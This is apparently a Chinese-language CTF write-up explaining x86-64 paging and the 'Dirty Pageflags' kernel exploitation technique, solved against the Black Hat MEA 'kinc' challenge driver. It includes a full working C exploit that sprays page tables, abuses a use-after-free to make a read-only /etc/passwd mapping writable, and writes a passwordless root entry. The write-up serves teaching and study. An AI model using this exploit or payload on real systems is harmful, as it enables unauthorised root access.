---
author: roxy
pubDatetime: 2026-04-06T23:07:58+08:00
title: "Dirty Pageflags"
categories:
  - "Kernel"
hideEditPost: true
description: "kernel exploitation"
---
# Dirty Pageflags

今天学习了一种kernel exploitation技术，名为**Dirty Pageflags**

参考:

https://ptr-yudai.hatenablog.com/entry/2025/09/14/180326

## 前置知识

**PTE**是`Page Table Entry`(页表项)

它是虚拟内存管理中最核心的数据结构之一，配合着`MMU`，用于将进程的`虚拟地址`转换为`物理地址`，并控制对该页面的**访问权限**和**状态**

每个页表项(通常对应`4KB`或`2MB`大小的内存页)记录了`虚拟页`被映射到了哪个`物理页框`(物理页帧号，**PFN**)

在x86-64架构下，一个PTE的结构如下所示:

![如图](/images/135.png)

其中52-62位是留给内核软件用的`自由位`

0-51位便是上面所说的PFN(物理页帧号)

而因为一个物理页的页大小是`4KB`，即4096字节，所以其低12位地址为0，只需存储高40位地址即可

故0-11位作为`标志位`使用

```text
物理地址 = (PFN << 12) + 页内偏移
```

我们重点关注以下**标志位**(Pageflags):

- 0 位 -> P(present) 用于记录页面是否在物理内存中，如果为1，则存在，如果为0，则不存在，访问该页会触发缺页异常(`page fault`)

- 1 位 -> **R/W**(read/write) **用于记录是否可写，0代表只读，1则代表可读写**

- 2 位 -> U/S(user/supervisor) 用于记录允许访问的权限级别，0代表内核态才允许访问(ring 0-2)，1则用户态亦可访问(ring 3)

- 6 位 -> **D**(dirty) 是否被写入过，由`CPU`设置，内核用于决定换出时是否需要写回`磁盘`，即`脏页`

- 63 位 -> XD(execute disable) cpu从该页所取的指令是否允许执行，0为可执行，1则不可执行，我们也可以叫它`NX`

试想一下

如果PTE中一个虚拟地址对应记录一个物理地址，而PTE还是要放在内存的

一个进程的页表本身就会大得无法接受

因此，Linux采用分层的**多级页表**来按需分配，以节省内存

我们重点关注x86-64架构下的四级页表结构

![如图](/images/136.png)

如图所示

对于一个64位的虚拟地址

其低48位拆分为多个索引字段

PGD索引(9 bits) -> PUD索引(9 bits) -> PMD索引(9 bits) -> PTE索引(9 bits) -> 页内偏移(12 bits)

具体:

![如图](/images/137.png)

> [!NOTE]
> 对于一个虚拟地址
>
> `CPU`的`MMU`查找过程如下:
>
> 从`CR3`寄存器获得`PGD`页的物理地址
>
> 取虚拟地址的`bits 47-39`作为PGD索引，找到对应的PUD页表项(如果该PGD项为`null`，则触发`page fault`)
>
> 取`bits 38-30`作为PUD索引，找到PMD页表项
>
> 取`bits 29-21`作为PMD索引，找到PTE页表项
>
> 取`bits 20-12`作为PTE索引，找到**物理页框**
>
> 最后`bits 11-0`作为页内偏移，得到最终的物理地址

同时，x86-64中每一级页表都是4KB，而一个`entry`是8字节，所以每一级有**512**项

最后，虚拟地址的高16位作用是什么呢?

它们的内容必须与第47位(虚拟地址的最高有效位)完全相同

这种形式的地址被称为**规范地址**(Canonical Address)

这本质上是一种**符号扩展**(Sign Extension)，将地址空间一分为二

当第47位为0时，高16位也全为0，地址落在**用户空间**(`0x0000_0000_0000_0000` ~ `0x0000_7FFF_FFFF_FFFF`)

当第47位为1时，高16位也全为1，地址落在**内核空间**(`0xFFFF_8000_0000_0000` ~ `0xFFFF_FFFF_FFFF_FFFF`)

CPU的`MMU`只处理**规范地址**

如果软件试图访问非规范地址，则会直接触发`#GP异常`(General Protection Fault)

这样设计的关键考量是为未来的扩展留出空间

如果将来需要更大的地址空间，硬件可以增加页表层级(比如到57位)，那些高16位目前是全1或全0的规范地址，在未来依然会是有效的规范地址，保证了**向前兼容性**

## exploitation

了解了前置知识

我们来看看具体的exploit

### Dirty Pagetable

名字似乎很像

但完全不一样

我还没学

故引用原文...

```text
Dirty Pagetable is a powerful exploitation technique that targets heap vulnerabilities in the Linux kernel.

The core idea is to overlap a freed object with a page table entry (PTE). By writing to the freed object, an attacker can directly manipulate the page table. Since each PTE maps to a physical memory address, this provides extremely strong control over physical memory. As a result, Dirty Pagetable can bypass critical security mechanisms such as KASLR, SMAP, and SMEP.
```

### Dirty Pageflags

不同于`Dirty Pagetable`操纵整个PTE以达成任意物理地址读写原语

`Dirty Pageflags`关注操纵PTE的标志位以完成利用并最终提权

那么哪个标志位最有助于我们的exploit呢?

可能会先想到U/S或是XD

它们虽然涉及访问与执行权限控制，但却不能真正帮助我们exploit

因此考虑一下R/W

想象一个只读文件

比如(`/etc/passwd`)

我们将其映射到内存中

![如图](/images/138.png)

我们操纵其PTE的R/W标志位

利用`UAF`等漏洞

将0置为1

只读变为可读写

随后我们向`/etc/passwd`中写入恶意内容

![如图](/images/140.png)

虽然此时修改只发生在内存中，还没有被写回到文件

但是，CPU会自动把PTE中的`D`(dirty)位设置为1，表示这个页面已经被修改过

最后，当内存区域被解除映射(`unmap`)时，Linux内核看到该页的`D`位被置1，就会认为这个页面必须被回写到它对应的后备文件

于是原本应该只读的文件(`/etc/passwd`)就被我们所写的恶意内容所覆盖了

root到手

## example

题目来自2025 Black Hat MEA资格赛的一道pwn题，名为`kinc`

### 源码分析

下面是`vuln.c`

```c
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ptr-yudai");
MODULE_DESCRIPTION("A vulnerable driver for a CTF");

#define CMD_ALLOC   0x0268
#define CMD_INC     0x0298
#define CMD_SEL     0x01c1
#define CMD_DELETE  0x0831

#define MAX_OBJ_NUM 0x100
#define PAD_SIZE    0x7f8

struct obj {
  char buf[PAD_SIZE];
  size_t cnt;
};

static struct kmem_cache *obj_cachep;
static DEFINE_MUTEX(module_lock);

unsigned char inc_used = 0;
struct obj *selected = 0;
struct obj *obj_array[MAX_OBJ_NUM] = { NULL };

static long module_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
  long ret = -EINVAL;
  mutex_lock(&module_lock);

  if (arg >= MAX_OBJ_NUM)
    goto out;

  switch (cmd) {
    case CMD_ALLOC:
      obj_array[arg] = kmem_cache_zalloc(obj_cachep, GFP_KERNEL);
      ret = 0;
      break;

    case CMD_SEL:
      if (!obj_array[arg])
        goto out;
      selected = obj_array[arg];
      ret = 0;
      break;

    case CMD_INC:
      if (inc_used++ > 1)
        goto out;
      selected->cnt++;
      ret = 0;
      break;

    case CMD_DELETE:
      if (!obj_array[arg])
        goto out;
      kmem_cache_free(obj_cachep, obj_array[arg]);
      obj_array[arg] = NULL;
      ret = 0;
      break;
  }

 out:
  mutex_unlock(&module_lock);
  return ret;
}

static struct file_operations module_fops = {
  .owner          = THIS_MODULE,
  .unlocked_ioctl = module_ioctl,
};

static struct miscdevice vuln_dev = {
  .minor = MISC_DYNAMIC_MINOR,
  .name = "vuln",
  .fops = &module_fops
};

static int __init module_initialize(void) {
  if (misc_register(&vuln_dev) != 0)
    return -EBUSY;

  obj_cachep = KMEM_CACHE(obj, 0);
  if (!obj_cachep) {
    misc_deregister(&vuln_dev);
    return -EBUSY;
  }

  return 0;
}

static void __exit module_cleanup(void) {
  misc_deregister(&vuln_dev);
  mutex_destroy(&module_lock);
}

module_init(module_initialize);
module_exit(module_cleanup);
```

内核模块`vuln.ko`提供了以下`ioctl`命令:

CMD_ALLOC -> 分配一个`struct obj`(大小为`0x800`字节)，存入`obj_array[index]`

CMD_SEL -> 将`selected`指针指向`obj_array[index]`

CMD_INC -> 执行`selected->cnt++`(但限制最多连续两次)

CMD_DELETE -> 释放`obj_array[index]`并清空数组项，**但不清除selected**

漏洞点很明显

释放对象后，`selected`仍指向已释放内存

通过两次`CMD_INC`，可以修改这块释放内存中的`cnt`字段(偏移`0x7f8`处，8字节)

但是即使存在`UAF`

我们只有两次的`CMD_INC`使用机会

该如何完成利用呢?

想必你已经想到了

我们将只读的`/etc/passwd`映射到内存中

其在PTE表项中的低2位分别是标志位P和R/W

表现为 0(只读) 1(present)

我们利用UAF

执行两次`CMD_INC`

标志位变为

1(**可读可写**) 1(present 保证存在)

随后写入恶意内容，例如，将root的密码设为空...

便能完成利用并提权

### 具体exploit

我们先定义下列函数:

```c
char* PTI_TO_VIRT(size_t pgd, size_t pud, size_t pmd, size_t pte) {
  assert (pgd < 0x200 && pud < 0x200 && pmd < 0x200 && pte < 0x200);
  return (void*)((pgd << 39) + (pud << 30) + (pmd << 21) + (pte << 12));
}
void* mmap_by_pti(size_t pgd, size_t pud, size_t pmd, size_t pte) {
  void *p = (void*)PTI_TO_VIRT(pgd, pud, pmd, pte);
  void *q = mmap(p, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED|MAP_FIXED, -1, 0);
  assert (p == q);
  return p;
}
void* mmap_file_by_pti(int fd, size_t pgd, size_t pud, size_t pmd, size_t pte) {
  void *p = (void*)PTI_TO_VIRT(pgd, pud, pmd, pte);
  void *q = mmap(p, 0x1000, PROT_READ, MAP_SHARED|MAP_FIXED, fd, 0);
  assert (p == q);
  return p;
}
```

`PTI_TO_VIRT`函数接受PGD，PUD，PMD，PTE四个索引值，并将它们`拼接`成一个完整的虚拟地址

公式:

```text
虚拟地址 = (pgd << 39) | (pud << 30) | (pmd << 21) | (pte << 12)
```

低12位默认为0，因此函数返回的是每个页表条目对应的页起始地址

这样构造出的虚拟地址在用户态是合法的，可用于后面的`mmap`操作，从而实现精确控制页表布局

而`mmap_file_by_pti`则将一个文件以**只读**，**共享**的方式，强制映射到由页表索引(pgd, pud, pmd, pte)计算出的精确虚拟地址上

我们选择的文件便是`/etc/passwd`

接下来

我们先利用ioctl的`CMD_ALLOC`分配0x100，即256个obj，每个obj的大小为`0x800`字节，即2KB

一共是512KB

```c
static struct kmem_cache *obj_cachep;

case CMD_ALLOC:
    obj_array[arg] = kmem_cache_zalloc(obj_cachep, GFP_KERNEL);
    ret = 0;
    break;
```

这些obj并非直接从**伙伴系统**(`buddy system`)分配，而是来自内核为该模块预先创建的专用**slab 缓存**(`obj_cachep`)

**slab分配器**负责从伙伴系统申请物理页(4KB)，然后将每个页切割成若干个大小相同的对象

对于2KB的obj，每个物理页可以容纳2个对象(`objs_per_slab = 2`)

因此，这256个obj一共占用128个物理页

接下来调用`CMD_SEL`选中任意一个obj

随后我们开始**PTE spraying**

在释放所有`obj`对象之前，我们先将目标文件`/etc/passwd`的大量只读映射`pin`在虚拟地址空间中

并迫使内核为这些映射分配好各级页表

这样，当对象释放后，新分配的PTE表就能精准占据obj原本占用的物理页

形成精准的**UAF**

```c
int etcfd = open("/etc/passwd", O_RDONLY);

#define ENTRY_PER_TABLE 512
#define SPRAY_NUM 0x1800
#define DELTA 0x7f8

for (size_t i = 0; i < SPRAY_NUM / ENTRY_PER_TABLE; i++) {
  for (size_t j = 0; j < ENTRY_PER_TABLE; j++) {
    mmap_file_by_pti(etcfd, 1, i, j, DELTA / 8);
    mmap_file_by_pti(etcfd, 1, i, j, (0x800 + DELTA) / 8);
  }
  volatile char c = *PTI_TO_VIRT(1, i, 0, DELTA / 8); // Allocate PGD and PMD
}
```

其中`mmap_file_by_pti`使用`MAP_FIXED`将`/etc/passwd`的第一个页面(偏移0)强制映射到虚拟地址`PTI_TO_VIRT(1, i, j, pte_idx)`

这里`pte_idx`分别为`DELTA/8`和`(0x800+DELTA)/8`

即为255和511

也就是说，每个PMD条目(即每张PTE表)中，我们只映射第255号和第511号PTE，其余PTE均保持空缺

内外两层循环

PGD索引固定为1

外层i循环遍历PUD索引(12个)，内层j循环遍历PMD索引(512个)

然而此时，这些`mmap`调用仅仅在进程的**VMA**(`虚拟内存区域`)中创建了映射记录，页表(PGD，PUD，PMD，PTE)尚未实际分配

> [!TIP]
> 内核采用**惰性分配策略**，直到第一次访问该地址时，才会通过缺页异常(page fault)建立真正的页表

因此

当执行`volatile char c = *PTI_TO_VIRT(1, i, 0, DELTA / 8)`时

PGD索引依旧固定为1，PMD和PTE索引则设置为0和255

遍历PUD索引0~11

此时触发了**缺页异常**，内核才完成了从PGD到PTE的各级页表分配，并建立了到文件缓存物理页(`/etc/passwd`)的映射

再引用一句原文:

```text
Unlike Dirty Pagetable, here we are repeatedly mapping the same file. As a result, only a single physical memory page is allocated for the file contents. This means Dirty Pageflags consumes far less memory compared to Dirty Pagetable, which I think is another advantage.
```

我们总共创建了`12 × 512 × 2 = 12288`个虚拟内存页(每个4KB)

但它们实际上都指向同一个物理页

即`/etc/passwd`的文件缓存页

所以从物理内存角度看，文件内容实际只占用1个物理页

接下来我们便可以调用`CMD_DELETE`释放所有obj

它们会被归还给`buddy system`

> [!NOTE]
> **slab缓存**释放对象时，并不会立即将整页返回伙伴系统，而是保留在`per-CPU`的`partial`列表中，以便快速重用
>
> 不过，我们调用`CMD_DELETE`释放了所有对象
>
> 当`slab缓存`中一个页上的所有对象都空闲后，该页会被标记为空闲，并最终归还给伙伴系统

**然而，我们现在仍然持有其中一个obj的悬垂指针(selected)**

随后

```c
  for (size_t i = 0; i < SPRAY_NUM / ENTRY_PER_TABLE; i++) {
    for (size_t j = 1; j < ENTRY_PER_TABLE; j++) {
      volatile char c;
      c = *PTI_TO_VIRT(1, i, j, DELTA / 8);
      c = *PTI_TO_VIRT(1, i, j, (0x800 + DELTA) / 8);
    }
  }
```

> [!TIP]
> 无论是四级页表中的哪一个，每个页表都是4KB，一共有512个索引

注意，内层循环的j从索引1开始，而不是0

PGD页表索引固定为1，早已分配，指向PUD

PUD中我们分配了12个索引，每个索引对应一个PMD，其中又各有512个索引

不过由于先前的`volatile char c = *PTI_TO_VIRT(1, i, 0, DELTA / 8)`，PUD到PMD的索引也已建立

唯一缺失的便是PMD到PTE的索引

因此执行`c = *PTI_TO_VIRT(1, i, j, DELTA / 8)`和`c = *PTI_TO_VIRT(1, i, j, (0x800 + DELTA) / 8)`时

内核需要从**伙伴系统**中分配一个4KB的物理页作为新的PTE表以建立索引

此时，伙伴系统中最近被释放的物理页正是之前存放`obj`的那些页面(128个4KB页，共512KB)

由于伙伴系统优先分配最近释放的内存，新分配的PTE表**极大概率**会占用原来`obj`对象所占用的物理页

一共触发了`12 × 511 × 2`次`page fault`

但实际只分配了`12 × 511`张PTE表

因为每张表被两个不同的PTE索引共享

而`12 × 511`个物理页**远大于**释放obj获得的128个物理页

那么

这些PTE表中就必然有一个覆盖了之前obj的内存区域

而`selected`仍然指向其中的一个物理页

这个物理页现在已经被内核重新分配为一张PTE表

因此，`selected`指针实际指向了一张PTE表

通过`selected->cnt++`我们就能修改这张PTE表中的某个8字节条目

由于`cnt`在`obj`结构中的偏移为`0x7f8`，而PTE表是由512个8字节的PTE组成的数组，偏移`0x7f8`恰好对应第`0x7f8 / 8 = 0xff(255)`个PTE

同理

也可能是第511个PTE

**这便是我们先前映射文件时选择的PTE索引为255和511的原因**

现在

我们执行两次`CMD_INC`

其中的一个PTE的标志位由`0 1`变为`1 1`

这个特定的PTE建立的映射中`/etc/passwd`便变为**可读可写**了

最后，我们循环遍历所有喷射的地址，尝试向每个地址写入我们准备好的恶意`passwd`行

```c
  // 101 --> 111
  int neko = open("/tmp/neko", O_RDWR | O_CREAT, 0666);
  write(neko, "root::0:0:root:/root:/bin/sh\n", 29);
  
  for (size_t i = 0; i < SPRAY_NUM / ENTRY_PER_TABLE; i++) {
    for (size_t j = 1; j < ENTRY_PER_TABLE; j++) {
      ssize_t s;
      lseek(neko, 0, SEEK_SET);
      s = read(neko, PTI_TO_VIRT(1, i, j, DELTA / 8), 29);
      if (s > 0) printf("wow: %ld, %ld\n", i, j);

      lseek(neko, 0, SEEK_SET);
      read(neko, PTI_TO_VIRT(1, i, j, (0x800 + DELTA) / 8), 29);
      if (s > 0) printf("wow: %ld, %ld (2)\n", i, j);
    }
  }
```

最终，必定会有一个地址被成功修改

当程序退出且所有文件描述符被关闭时，被修改的文件会设置其`Dirty`标志

因此，Linux内核会将修改后的内容写回磁盘，从而有效地覆盖原本是**只读**的`/etc/passwd`文件

这里为什么用**read系统调用**呢?

依旧引用一下原文

```text
In some cases like use-after-free, however, we don't know which entry is modified. Writing to an unmodified entry will result in SIGSEGV because it does not have R/W flag set. To resolve this issue, we can use syscall to write to the memory because simply return -1 when it tried to write a read-only mapping, instead of crashing.
```

### 总结与exp

完整exp：

```c
#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define CMD_ALLOC   0x0268
#define CMD_INC     0x0298
#define CMD_SEL     0x01c1
#define CMD_DELETE  0x0831

static void fatal(const char *s) {
  perror(s);
  exit(1);
}

void pin_cpu(int cpu) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(cpu, &set);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &set))
    fatal("sched_setaffinity");
}

int fd;

int module_alloc (size_t index) { return ioctl(fd, CMD_ALLOC , index); }
int module_inc() { return ioctl(fd, CMD_INC, 0); }
int module_sel(size_t index) { return ioctl(fd, CMD_SEL, index); }
int module_delete(size_t index) { return ioctl(fd, CMD_DELETE, index); }

#define MAX_OBJ_NUM 0x100
#define OBJ_SIZE    0x800

#define OBJS_PER_SLAB 8    // /sys/kernel/slab/obj/objs_per_slab
#define CPU_PARTIAL   24   // /sys/kernel/slab/obj/cpu_partial

char* PTI_TO_VIRT(size_t pgd, size_t pud, size_t pmd, size_t pte) {
  assert (pgd < 0x200 && pud < 0x200 && pmd < 0x200 && pte < 0x200);
  return (void*)((pgd << 39) + (pud << 30) + (pmd << 21) + (pte << 12));
}

void* mmap_by_pti(size_t pgd, size_t pud, size_t pmd, size_t pte) {
  void *p = (void*)PTI_TO_VIRT(pgd, pud, pmd, pte);
  void *q = mmap(p, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED|MAP_FIXED, -1, 0);
  assert (p == q);
  return p;
}

void* mmap_file_by_pti(int fd, size_t pgd, size_t pud, size_t pmd, size_t pte) {
  void *p = (void*)PTI_TO_VIRT(pgd, pud, pmd, pte);
  void *q = mmap(p, 0x1000, PROT_READ, MAP_SHARED|MAP_FIXED, fd, 0);
  assert (p == q);
  return p;
}

#define ENTRY_PER_TABLE 512
#define SPRAY_NUM 0x1800
#define DELTA 0x7f8

int main() {
  int etcfd = open("/etc/passwd", O_RDONLY);
  if (etcfd == -1) fatal("/etc/passwd");

  fd = open("/dev/vuln", O_RDWR);
  if (fd == -1) fatal("/dev/vuln");

  pin_cpu(0);

  puts("[+] Spraying objects...");
  for (size_t i = 0; i < MAX_OBJ_NUM; i++)
    if (module_alloc(i % MAX_OBJ_NUM) != 0)
      fatal("module_alloc");

  if (module_sel(50) != 0)
    fatal("module_sel");

  puts("[+] Preparing pages...");
  for (size_t i = 0; i < SPRAY_NUM / ENTRY_PER_TABLE; i++) {
    for (size_t j = 0; j < ENTRY_PER_TABLE; j++) {
      mmap_file_by_pti(etcfd, 1, i, j, DELTA / 8);
      mmap_file_by_pti(etcfd, 1, i, j, (0x800 + DELTA) / 8);
    }
    volatile char c = *PTI_TO_VIRT(1, i, 0, DELTA / 8);
  }

  puts("[+] Returning page to buddy allocator");
  for (size_t i = 0; i < MAX_OBJ_NUM; i++)
    if (module_delete(i) != 0)
      fatal("module_delete");

  puts("[+] Spraying PTEs...");
  for (size_t i = 0; i < SPRAY_NUM / ENTRY_PER_TABLE; i++) {
    for (size_t j = 1; j < ENTRY_PER_TABLE; j++) {
      volatile char c;
      c = *PTI_TO_VIRT(1, i, j, DELTA / 8);
      c = *PTI_TO_VIRT(1, i, j, (0x800 + DELTA) / 8);
    }
  }

  puts("Go");
  if (module_inc() != 0)
    fatal("module_inc");
  if (module_inc() != 0)
    fatal("module_inc");

  // 101 --> 111
  int neko = open("/tmp/neko", O_RDWR | O_CREAT, 0666);
  write(neko, "root::0:0:root:/root:/bin/sh\n", 29);
  
  for (size_t i = 0; i < SPRAY_NUM / ENTRY_PER_TABLE; i++) {
    for (size_t j = 1; j < ENTRY_PER_TABLE; j++) {
      ssize_t s;
      lseek(neko, 0, SEEK_SET);
      s = read(neko, PTI_TO_VIRT(1, i, j, DELTA / 8), 29);
      if (s > 0) printf("wow: %ld, %ld\n", i, j);

      lseek(neko, 0, SEEK_SET);
      read(neko, PTI_TO_VIRT(1, i, j, (0x800 + DELTA) / 8), 29);
      if (s > 0) printf("wow: %ld, %ld (2)\n", i, j);
    }
  }

  puts("What's up?");
  return 0;
}
```

最后

**get root**

![如图](/images/141.png)



